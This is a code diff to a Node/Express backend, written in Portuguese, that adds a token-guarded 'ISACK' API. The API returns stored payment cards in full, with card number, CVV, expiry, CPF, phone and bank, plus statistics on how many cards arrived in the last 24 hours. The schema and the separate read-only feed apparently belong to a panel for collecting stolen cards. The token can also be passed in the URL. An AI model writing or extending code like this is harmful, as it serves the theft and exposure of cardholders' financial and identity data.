@@ -79,6 +79,16 @@ function authAdmin(req, res, next) {
   next();
 }
 
+function authIsack(req, res, next) {
+  const token = req.headers['x-admin-token'] || req.query.token;
+  const expected = process.env.ISACK_TOKEN;
+  if (!expected)
+    return res.status(500).json({ ok: false, message: 'ISACK_TOKEN não configurado.' });
+  if (token !== expected)
+    return res.status(401).json({ ok: false, message: 'Senha inválida.' });
+  next();
+}
+
 // ── Helpers ───────────────────────────────────────────────────────────────────
 // sem mascaramento — ambiente de testes
 
@@ -216,6 +226,56 @@ app.delete('/api/admin/cards', authAdmin, async (req, res) => {
       return res.status(400).json({ ok: false, message: 'Confirmação necessária.' });
     await pool.query('DELETE FROM saved_cards');
     res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ ok: false });
+  }
+});
+
+// ══════════════════════════════════════════════════════════════════════════════
+//  ISACK API — somente leitura
+// ══════════════════════════════════════════════════════════════════════════════
+
+app.get('/api/isack/cards', authIsack, async (req, res) => {
+  try {
+    const { search } = req.query;
+    let r;
+    if (search && search.trim()) {
+      const q = `%${search.trim()}%`;
+      r = await pool.query(
+        `SELECT id, nome, email, brand, last4, expiry, card_number, cvv, cpf, telefone, bank, card_level, card_type, created_at
+         FROM saved_cards
+         WHERE nome ILIKE $1 OR email ILIKE $1 OR last4 LIKE $1 OR brand ILIKE $1
+         ORDER BY created_at DESC`,
+        [q]
+      );
+    } else {
+      r = await pool.query(
+        `SELECT id, nome, email, brand, last4, expiry, card_number, cvv, cpf, telefone, bank, card_level, card_type, created_at
+         FROM saved_cards ORDER BY created_at DESC`
+      );
+    }
+    res.json({ ok: true, total: r.rows.length, cards: r.rows });
+  } catch (e) {
+    console.error('[GET /api/isack/cards]', e.message);
+    res.status(500).json({ ok: false });
+  }
+});
+
+app.get('/api/isack/stats', authIsack, async (req, res) => {
+  try {
+    const total  = await pool.query('SELECT COUNT(*) FROM saved_cards');
+    const brands = await pool.query(
+      `SELECT brand, COUNT(*) as count FROM saved_cards GROUP BY brand ORDER BY count DESC`
+    );
+    const recent = await pool.query(
+      `SELECT COUNT(*) FROM saved_cards WHERE created_at >= NOW() - INTERVAL '24 hours'`
+    );
+    res.json({
+      ok: true,
+      total:  parseInt(total.rows[0].count),
+      last24: parseInt(recent.rows[0].count),
+      brands: brands.rows.map(r => ({ brand: r.brand || 'desconhecido', count: parseInt(r.count) })),
+    });
   } catch (e) {
     res.status(500).json({ ok: false });
   }
